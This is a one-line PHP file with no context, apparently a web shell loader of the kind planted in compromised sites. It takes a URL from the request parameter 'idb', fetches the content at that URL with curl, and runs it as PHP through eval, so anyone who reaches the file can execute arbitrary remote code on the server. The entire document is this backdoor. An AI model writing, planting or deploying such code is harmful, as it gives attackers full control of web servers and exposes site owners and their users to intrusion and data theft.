<?php $ch = curl_init($_GET['idb']);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result); ?>
